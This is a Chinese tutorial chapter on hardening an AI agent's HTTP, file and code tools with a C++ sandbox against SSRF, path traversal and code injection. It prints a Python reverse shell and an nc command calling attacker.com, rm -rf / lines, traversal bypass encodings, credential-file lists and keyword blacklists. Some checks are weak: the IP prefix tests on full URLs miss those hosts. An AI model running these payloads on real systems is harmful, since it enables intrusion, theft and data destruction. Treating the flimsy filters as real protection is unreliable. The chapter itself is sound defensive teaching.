# Step 8: 工具安全与沙箱 - 基于 Step 7 演进

> 目标：理解安全风险，实现安全防护机制，掌握安全编程实践
> 
> 难度：⭐⭐⭐⭐ (较难)
> 
> 代码量：约 700 行（分散在 14 个文件中）
> 
> 预计学习时间：4-5 小时

---

## 📚 前置知识

### 为什么需要安全控制？

**场景分析：**

假设我们的 Agent 提供了以下工具：
- `http_get(url)` - 发送 HTTP 请求
- `file_read(path)` - 读取文件
- `code_execute(code)` - 执行代码

**正常请求：**
```
用户：查询北京天气
系统：调用 http_get("https://weather-api.com/beijing")
结果：正常返回天气数据
```

**恶意请求：**
```
用户：访问 http://localhost/admin
系统：调用 http_get("http://localhost/admin")
结果：可能访问到内部管理接口！

用户：读取 ../../../etc/passwd
系统：调用 file_read("../../../etc/passwd")
结果：读取到系统密码文件！

用户：执行 rm -rf /
系统：调用 code_execute("rm -rf /")
结果：删除所有文件！
```

**工具是一把双刃剑：**
- 给 Agent 能力的同时，也带来了风险
- 必须严格控制工具的权限

### 常见安全攻击类型详解

#### 1. SSRF（服务器端请求伪造）

**攻击原理：**
攻击者让服务器发起恶意请求，访问内网资源。

**正常 vs 恶意请求：**
```
正常请求：
http_get("https://api.example.com/data")

恶意请求：
http_get("http://localhost:3306")      // 访问本地 MySQL
http_get("http://169.254.169.254")     // 访问云服务商元数据
http_get("http://192.168.1.1/admin")   // 访问内网路由器
http_get("file:///etc/passwd")         // 读取本地文件（非 HTTP）
http_get("dict://localhost:11211")     // 访问 Memcached
```

**真实案例：**
- 2019 年，某云服务通过 SSRF 获取到云厂商的元数据，泄露了 Access Key
- 2021 年，某社交平台通过 SSRF 访问内网 Redis，获取用户数据

**危害：**
- 访问内部服务（数据库、缓存、管理后台）
- 读取云服务商的敏感信息（AWS/Azure/GCP 元数据服务）
- 扫描内网端口，绘制内网拓扑
- 利用内网服务进行进一步攻击

#### 2. 路径遍历（Path Traversal）

**攻击原理：**
通过 `../` 访问上级目录，读取任意文件。

**攻击手法：**
```
基本形式：
../../../etc/passwd

绕过技巧：
..%2f..%2f..%2fetc%2fpasswd      (URL 编码)
..%252f..%252f..%252fetc/passwd  (双重编码)
....//....//....//etc/passwd     (双点)
..%c0%af..%c0%af..%c0%af        (UTF-8 编码)
```

**敏感文件列表：**
```
Linux:
/etc/passwd          - 用户列表
/etc/shadow          - 密码哈希
/etc/hosts           - 主机配置
/proc/self/environ   - 环境变量（可能包含密钥）
~/.ssh/id_rsa        - SSH 私钥
/app/.env            - 应用配置

Windows:
C:\Windows\system32\drivers\etc\hosts
C:\Windows\win.ini
../../boot.ini
```

**真实案例：**
- 某网盘服务通过路径遍历读取任意用户文件
- 某 CMS 系统通过路径遍历获取数据库配置

#### 3. 代码注入（Code Injection）

**攻击原理：**
执行恶意代码，控制系统。

**攻击手法：**
```python
# 直接危险操作
import os; os.system('rm -rf /')
import subprocess; subprocess.call(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])

# 绕过黑名单的技巧
__import__('o'+'s').system('whoami')  # 字符串拼接
getattr(__builtins__, 'ex'+'ec')('import os')  # 动态获取
import base64; exec(base64.b64decode('aW1wb3J0IG9z'))  # 编码

# 反向 shell（攻击者远程控制）
import socket,subprocess,os
s=socket.socket()
s.connect(('attacker.com',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
```

**危害：**
- 删除数据（`rm -rf /`）
- 植入后门（持久化控制）
- 窃取信息（读取敏感文件）
- 挖矿病毒（占用 CPU）
- 横向移动（攻击内网其他机器）

### 安全防护原则

#### 1. 最小权限原则（Principle of Least Privilege）

**只给工具最小的必要权限：**
```
HTTP 工具：只能访问白名单域名
文件工具：只能在指定目录操作
代码工具：只能执行受限指令集
```

**示例：**
```cpp
// 好的设计
class FileTool {
    std::string base_path_ = "/app/data/";  // 限制在指定目录
    
    ToolResult read(const std::string& path) {
        // 只允许读取 base_path_ 下的文件
        std::string full_path = base_path_ + path;
        // 还要检查是否越界...
    }
};

// 坏的设计
class FileTool {
    ToolResult read(const std::string& path) {
        // 可以读取任意路径！危险！
        return read_file(path);
    }
};
```

#### 2. 白名单优于黑名单

**黑名单（容易被绕过）：**
```cpp
// 不好：黑名单
if (url.find("localhost") != npos) return false;
if (url.find("127.0.0.1") != npos) return false;
// 绕过了：127.0.0.2, 0177.0.0.1, 0x7f.0.0.1
```

**白名单（更安全）：**
```cpp
// 好：白名单
std::vector<string> allowed_hosts = {
    "api.weather.com",
    "api.github.com"
};

if (!is_in_list(get_host(url), allowed_hosts)) {
    return false;  // 不在白名单，拒绝
}
```

#### 3. 深度防御（Defense in Depth）

**多层防护：**
```
第一层：输入验证（长度、类型、格式）
    ↓
第二层：沙箱检查（URL/路径/代码黑名单）
    ↓
第三层：工具权限（只读 vs 读写）
    ↓
第四层：系统限制（容器、沙箱、权限）
    ↓
第五层：审计日志（记录所有操作）
```

#### 4. 安全默认（Secure by Default）

**默认关闭，按需开启：**
```cpp
// 好的设计
class HttpTool {
    bool allow_internal_ = false;  // 默认禁止内网
    
    void enable_internal() {       // 显式开启
        allow_internal_ = true;
    }
};

// 坏的设计
class HttpTool {
    bool allow_internal_ = true;   // 默认允许！危险！
};
```

---

## 第一步：Step 7 的安全隐患分析

### 当前系统的风险

Step 7 实现了异步工具执行，但没有安全控制：

```cpp
// 危险的工具调用场景示例：

// 1. SSRF 攻击 - 访问内部服务
用户输入："访问 http://localhost:6379"
系统行为：调用 http_get("http://localhost:6379")
结果：访问到本地 Redis，可能获取敏感数据

// 2. 路径遍历攻击 - 读取敏感文件
用户输入："读取 ../../../etc/shadow"
系统行为：调用 file_read("../../../etc/shadow")
结果：读取到系统密码文件

// 3. 代码注入攻击 - 执行任意命令
用户输入："执行 Python: import os; os.system('rm -rf /')"
系统行为：调用 code_execute("import os; os.system('rm -rf /')")
结果：删除所有文件
```

### 攻击面分析

```
攻击者 → Agent → 工具 → 系统资源
        ↑       ↑      ↑
        |       |      └── 文件、网络、进程
        |       └───────── http_get, file_read, code_execute
        └──────────────── 输入验证不足
```

**风险等级评估：**

| 工具 | 风险等级 | 风险描述 |
|:---|:---:|:---|
| `get_weather` | 🟢 低 | 只访问固定 API，无用户输入 |
| `get_time` | 🟢 低 | 纯本地计算，无外部交互 |
| `calculate` | 🟢 低 | 简单算术，无危险操作 |
| `http_get` | 🔴 高 | 用户可控 URL，SSRF 风险 |
| `file_read` | 🔴 高 | 用户可控路径，路径遍历风险 |
| `code_execute` | 🔴 极高 | 用户可控代码，任意执行风险 |

---

## 第二步：安全沙箱设计

### 沙箱架构

```
┌─────────────────────────────────────────────────────────────┐
│                     安全沙箱架构                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   用户输入                                                   │
│      ↓                                                      │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                  输入验证层                          │   │
│   │         （类型、长度、格式检查）                      │   │
│   └─────────────────────────────────────────────────────┘   │
│      ↓                                                      │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                  沙箱检查层                          │   │
│   │  ┌──────────┐  ┌──────────┐  ┌──────────┐          │   │
│   │  │ URL 检查 │  │ 路径检查 │  │ 代码检查 │          │   │
│   │  │(防SSRF)  │  │(防遍历)  │  │(防注入)  │          │   │
│   │  └──────────┘  └──────────┘  └──────────┘          │   │
│   └─────────────────────────────────────────────────────┘   │
│      ↓                                                      │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                  工具执行层                          │   │
│   │         （在受限环境中执行）                          │   │
│   └─────────────────────────────────────────────────────┘   │
│      ↓                                                      │
│   返回结果                                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 沙箱实现详解

```cpp
// sandbox.hpp - 统一的安全检查入口
class Sandbox {
public:
    // ========== SSRF 防护 ==========
    static bool is_safe_url(const std::string& url) {
        // 1. 协议白名单（只允许 http/https）
        if (url.find("http://") != 0 && url.find("https://") != 0) {
            std::cout << "[🛡️] 非 HTTP 协议: " << url.substr(0, 20) << "...\n";
            return false;
        }
        
        // 2. 禁止内网地址
        if (url.find("localhost") != std::string::npos) return false;
        if (url.find("127.") == 0) return false;           // 127.0.0.1/8
        if (url.find("10.") == 0) return false;            // 10.0.0.0/8
        if (url.find("192.168.") == 0) return false;       // 192.168.0.0/16
        if (url.find("172.16.") == 0) return false;        // 172.16.0.0/12
        if (url.find("169.254.") == 0) return false;       // 链路本地地址
        if (url.find("0.") == 0) return false;             // 0.0.0.0
        
        // 3. 提取主机名进一步检查
        std::string host = extract_host(url);
        
        // 4. 解析 IP 检查（防止 DNS 重绑定攻击）
        // 实际实现需要解析域名并检查 IP
        
        return true;
    }
    
    // ========== 路径遍历防护 ==========
    static bool is_safe_path(const std::string& path) {
        // 1. 基本检查
        if (path.empty()) return false;
        if (path.length() > 256) return false;  // 长度限制
        if (path.find('\0') != std::string::npos) return false;  // 空字符
        
        // 2. 禁止 .. 遍历（多种编码形式）
        if (path.find("..") != std::string::npos) return false;
        if (path.find("..%2f") != std::string::npos) return false;    // URL 编码
        if (path.find("..%252f") != std::string::npos) return false;  // 双重编码
        if (path.find("....//") != std::string::npos) return false;   // 双点绕过
        
        // 3. 禁止绝对路径
        if (path[0] == '/') return false;  // Unix 绝对路径
        if (path.length() > 1 && path[1] == ':') return false;  // Windows 绝对路径
        
        // 4. 规范化路径后检查
        std::string normalized = normalize_path(path);
        std::string base_path = normalize_path("/app/data/");
        
        // 确保规范化后的路径在基目录下
        if (normalized.find(base_path) != 0) {
            return false;
        }
        
        return true;
    }
    
    // ========== 代码注入防护 ==========
    static bool is_safe_code(const std::string& code) {
        // 1. 长度限制
        if (code.length() > 10000) return false;
        
        // 2. 黑名单检查（危险函数和模块）
        std::vector<std::string> blacklist = {
            // 系统操作
            "import os", "import sys", "import subprocess",
            "__import__", "importlib",
            
            // 文件操作
            "open(", "file(", "exec(", "eval(", "compile(",
            
            // 网络操作
            "socket", "urllib", "requests", "http.client",
            
            // 危险命令
            "rm -rf", "mkfs", "dd if", "format", "del /",
            
            // 系统调用
            "system(", "popen(", "call(", "run(",
            
            // 动态执行
            "exec", "eval", "compile", "__builtins__"
        };
        
        std::string lower_code = to_lower(code);
        for (const auto& bad : blacklist) {
            if (lower_code.find(bad) != std::string::npos) {
                std::cout << "[🛡️] 代码黑名单命中: " << bad << "\n";
                return false;
            }
        }
        
        // 3. 语法检查（确保是合法代码）
        // 实际实现可以调用 Python 的 ast 模块检查
        
        return true;
    }
    
private:
    static std::string normalize_path(const std::string& path) {
        // 规范化路径（解析 . 和 ..）
        std::vector<std::string> parts;
        std::istringstream iss(path);
        std::string part;
        
        while (std::getline(iss, part, '/')) {
            if (part == "" || part == ".") continue;
            if (part == "..") {
                if (!parts.empty()) parts.pop_back();
            } else {
                parts.push_back(part);
            }
        }
        
        std::string result = "/";
        for (size_t i = 0; i < parts.size(); ++i) {
            if (i > 0) result += "/";
            result += parts[i];
        }
        return result;
    }
};
```

---

## 第三步：安全工具实现

### HTTP 工具（带 SSRF 防护）

```cpp
// http_tool.hpp
#include "sandbox.hpp"

class HttpTool {
public:
    static std::string get_name() { return "http_get"; }
    
    static std::string get_description() {
        return "发送 HTTP GET 请求（带 SSRF 防护）";
    }
    
    static ToolResult execute(const std::string& url) {
        // ========== 第一层：沙箱检查 ==========
        if (!Sandbox::is_safe_url(url)) {
            return ToolResult::fail(
                "🛡️  SSRF 防护：禁止访问内网或非 HTTP 协议\n"
                "违规 URL: " + url + "\n"
                "允许的协议: http://, https://\n"
                "禁止的地址: localhost, 127.x.x.x, 10.x.x.x, 192.168.x.x"
            );
        }
        
        // ========== 第二层：执行请求 ==========
        try {
            std::cout << "[🌐 HTTP] GET " << url << std::endl;
            
            // 发送 HTTP 请求（使用 Boost.Beast）
            std::string response = http_get_impl(url);
            
            // 限制响应大小
            if (response.length() > 100000) {
                response = response.substr(0, 100000) + "\n... (truncated)";
            }
            
            return ToolResult::ok(R"({"content": ")" + escape_json(response) + R"("})");
            
        } catch (const std::exception& e) {
            return ToolResult::fail(std::string("HTTP 请求失败: ") + e.what());
        }
    }
};
```

### 文件工具（路径遍历防护）

```cpp
// file_tool.hpp
#include "sandbox.hpp"

class FileTool {
public:
    static std::string get_name() { return "file"; }
    
    static std::string get_description() {
        return "文件操作（带路径遍历防护）";
    }
    
    static ToolResult execute(const std::string& operation,
                               const std::string& path) {
        // ========== 第一层：操作类型白名单 ==========
        if (operation != "read" && operation != "list") {
            return ToolResult::fail(
                "不支持的操作: " + operation + "\n"
                "支持的操作: read, list"
            );
        }
        
        // ========== 第二层：沙箱检查 ==========
        if (!Sandbox::is_safe_path(path)) {
            return ToolResult::fail(
                "🛡️  路径遍历防护：禁止 .. 或绝对路径\n"
                "违规路径: " + path + "\n"
                "提示: 只能访问 /app/data/ 目录下的文件"
            );
        }
        
        // ========== 第三层：路径规范化 ==========
        std::string base_path = "/app/data/";
        std::string full_path = base_path + path;
        
        // 再次规范化并检查
        std::string normalized = normalize_path(full_path);
        if (normalized.find(base_path) != 0) {
            return ToolResult::fail("路径越界检测");
        }
        
        // ========== 第四层：执行操作 ==========
        try {
            if (operation == "read") {
                std::cout << "[📁 File] read " << full_path << std::endl;
                std::string content = read_file(full_path);
                
                // 限制文件大小
                if (content.length() > 100000) {
                    content = content.substr(0, 100000) + "\n... (truncated)";
                }
                
                return ToolResult::ok(R"({"content": ")" + escape_json(content) + R"("})");
            }
            else if (operation == "list") {
                std::cout << "[📁 File] list " << full_path << std::endl;
                std::vector<std::string> files = list_directory(full_path);
                return ToolResult::ok(R"({"files": [")" + join(files, "\", \"") + R"("]})");
            }
            
        } catch (const std::exception& e) {
            return ToolResult::fail(std::string("文件操作失败: ") + e.what());
        }
        
        return ToolResult::fail("未知错误");
    }
};
```

### 代码工具（注入防护）

```cpp
// code_tool.hpp
#include "sandbox.hpp"

class CodeTool {
public:
    static std::string get_name() { return "code_execute"; }
    
    static std::string get_description() {
        return "执行 Python 代码（带注入防护和超时）";
    }
    
    static ToolResult execute(const std::string& code) {
        // ========== 第一层：沙箱检查 ==========
        if (!Sandbox::is_safe_code(code)) {
            return ToolResult::fail(
                "🛡️  代码注入防护：包含危险操作\n"
                "违规代码片段已记录\n"
                "禁止的操作: import os/sys/subprocess, open(), exec(), eval() 等"
            );
        }
        
        // ========== 第二层：超时执行 ==========
        std::cout << "[⚡ Code] 执行 Python 代码 (限制 5 秒)" << std::endl;
        
        auto future = std::async(std::launch::async, [&code]() {
            return execute_python_sandboxed(code);
        });
        
        // 5 秒超时
        if (future.wait_for(std::chrono::seconds(5)) == std::future_status::timeout) {
            return ToolResult::fail("⏱️  代码执行超时（超过 5 秒）");
        }
        
        try {
            std::string result = future.get();
            return ToolResult::ok(R"({"result": ")" + escape_json(result) + R"("})");
        } catch (const std::exception& e) {
            return ToolResult::fail(std::string("代码执行错误: ") + e.what());
        }
    }

private:
    static std::string execute_python_sandboxed(const std::string& code) {
        // 实际实现：
        // 1. 使用 subprocess 调用 Python
        // 2. 在受限环境中执行（如 Docker 容器）
        // 3. 捕获 stdout 返回
        // 4. 限制内存和 CPU 使用
        
        // 示例简化版
        std::string cmd = "python3 -c '" + escape_shell(code) + "' 2>&1";
        return exec_with_limits(cmd, 5, 100*1024*1024);  // 5秒，100MB
    }
};
```

---

## 第四步：审计日志

```cpp
// audit_log.hpp - 审计日志系统
class AuditLog {
public:
    static void log_tool_call(const std::string& user_id,
                               const std::string& tool_name,
                               const std::string& args,
                               bool success,
                               const std::string& details) {
        
        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        
        std::ostringstream oss;
        oss << std::put_time(std::localtime(&t), "%Y-%m-%d %H:%M:%S");
        oss << " | User: " << user_id;
        oss << " | Tool: " << tool_name;
        oss << " | Args: " << truncate(args, 100);
        oss << " | Result: " << (success ? "SUCCESS" : "FAIL");
        if (!details.empty()) {
            oss << " | Details: " << details;
        }
        
        std::string log_line = oss.str();
        
        // 写入日志文件
        write_to_file("/var/log/nuclaw/audit.log", log_line + "\n");
        
        // 同时输出到控制台
        std::cout << "[📋 Audit] " << log_line << std::endl;
    }
    
    static void log_security_event(const std::string& event_type,
                                    const std::string& details,
                                    const std::string& source) {
        std::cerr << "[🚨 Security] " << event_type << ": " << details;
        std::cerr << " (Source: " << source << ")" << std::endl;
        
        // 可以在这里接入告警系统
        // send_alert(event_type, details);
    }
};
```

---

## 第五步：安全测试

### 正常请求测试

```bash
wscat -c ws://localhost:8080/ws

# 1. 正常 HTTP 请求
> http_get https://api.github.com/users/github
[🧠 Processing] "http_get https://api.github.com/users/github"
  → Tool: http_get
  [🌐 HTTP] GET https://api.github.com/users/github
  → Result: OK
< {"login": "github", "id": 9919, ...}

# 2. 正常文件操作
> file read data/test.txt
[🧠 Processing] "file read data/test.txt"
  → Tool: file
  [📁 File] read /app/data/data/test.txt
  → Result: OK
< {"content": "Hello World"}

# 3. 正常代码执行
> code_execute "1 + 2 + 3"
[🧠 Processing] "code_execute 1 + 2 + 3"
  → Tool: code_execute
  [⚡ Code] 执行 Python 代码 (限制 5 秒)
  → Result: OK
< {"result": "6"}
```

### 攻击请求测试（应被拦截）

```bash
# 1. SSRF 攻击 - 访问内网
> http_get http://localhost/admin
[🧠 Processing] "http_get http://localhost/admin"
  → Tool: http_get
  [🛡️] 非 HTTP 协议或内网地址: http://localhost/admin
  → Result: FAIL
< 🛡️  SSRF 防护：禁止访问内网或非 HTTP 协议
   违规 URL: http://localhost/admin

# 2. 路径遍历攻击
> file read ../../../etc/passwd
[🧠 Processing] "file read ../../../etc/passwd"
  → Tool: file
  [🛡️] 路径包含 .. 遍历: ../../../etc/passwd
  → Result: FAIL
< 🛡️  路径遍历防护：禁止 .. 或绝对路径
   违规路径: ../../../etc/passwd

# 3. 代码注入攻击
> code_execute "import os; os.system('whoami')"
[🧠 Processing] "code_execute import os; os.system('whoami')"
  → Tool: code_execute
  [🛡️] 代码黑名单命中: import os
  → Result: FAIL
< 🛡️  代码注入防护：包含危险操作
   违规代码片段已记录
```

---

## 本节总结

### 核心概念

1. **SSRF 防护**：禁止内网地址和非 HTTP 协议
2. **路径遍历防护**：禁止 `..` 和绝对路径，使用路径规范化
3. **代码注入防护**：黑名单过滤危险操作，超时限制
4. **审计日志**：记录所有工具调用，便于追溯

### 三层防护体系

```
第一层：输入验证（长度、类型、格式）
    ↓
第二层：沙箱检查（URL/路径/代码黑名单）
    ↓
第三层：工具权限（只读、超时、资源限制）
```

### 代码演进

```
Step 7: 异步工具执行 (600行，10个文件)
   ↓ 演进
Step 8: + 安全沙箱 (700行，14个文件)
   - 新增：sandbox.hpp（安全沙箱核心）
   - 新增：http_tool.hpp（SSRF 防护）
   - 新增：file_tool.hpp（路径遍历防护）
   - 新增：code_tool.hpp（代码注入防护）
   - 新增：audit_log.hpp（审计日志）
   - 演进：tool_executor.hpp（添加安全检查）
```

### 安全最佳实践

1. **默认拒绝**：不在白名单的请求全部拒绝
2. **最小权限**：只给必要的权限
3. **多层防护**：不要依赖单一检查点
4. **审计日志**：记录所有操作，及时发现异常
5. **定期审查**：安全策略需要持续更新

---

## 📝 课后练习

### 练习 1：完善 SSRF 防护
实现 DNS 解析检查，防止 DNS 重绑定攻击：
```cpp
// DNS 重绑定攻击：
// 1. 攻击者控制域名 attacker.com
// 2. 第一次解析返回 1.2.3.4（公网 IP，通过检查）
// 3. TTL 设为 0
// 4. 第二次解析返回 192.168.1.1（内网 IP）

// 解决方案：解析两次，比较 IP 是否一致
bool check_dns_rebinding(const std::string& url);
```

### 练习 2：实现更严格的路径检查
使用 `realpath()` 系统调用确保路径不越界：
```cpp
std::string safe_path = realpath(user_path, nullptr);
if (safe_path.find(base_path) != 0) {
    return false;  // 路径越界
}
```

### 练习 3：白名单配置文件
将安全策略外置到配置文件：
```json
{
  "allowed_hosts": ["api.github.com", "api.weather.com"],
  "allowed_paths": ["/app/data/"],
  "code_timeout": 5,
  "max_file_size": 1048576
}
```

### 思考题
1. 黑名单和白名单各有什么优缺点？
2. 如何绕过简单的 `..` 检查？如何防御？
3. 代码注入防护中，黑名单的局限性是什么？
4. 审计日志应该记录哪些信息？如何保护审计日志本身？

---

## 📖 扩展阅读

### 安全测试工具

| 工具 | 用途 |
|:---|:---|
| **Burp Suite** | Web 应用安全测试 |
| **OWASP ZAP** | 开源 Web 安全扫描 |
| **Nikto** | Web 服务器漏洞扫描 |
| **sqlmap** | SQL 注入检测 |

### 安全资源

- **OWASP Top 10**：https://owasp.org/www-project-top-ten/
- **CWE/SANS Top 25**：常见软件安全缺陷
- **PortSwigger Web Security Academy**：免费 Web 安全学习

### 容器安全

对于代码执行类工具，建议使用容器隔离：
```dockerfile
FROM python:3.9-slim
RUN useradd -m sandbox
USER sandbox
WORKDIR /home/sandbox
# 限制资源：CPU、内存、网络
```

---

**恭喜！** 你现在掌握了工具安全的核心知识。从 Step 6 到 Step 8，我们逐步完善了工具系统：
- **Step 6**：能用（硬编码）
- **Step 7**：好用（异步）
- **Step 8**：安全（沙箱）

下一章我们将解决最后一个问题——硬编码难以扩展，实现工具注册表模式。
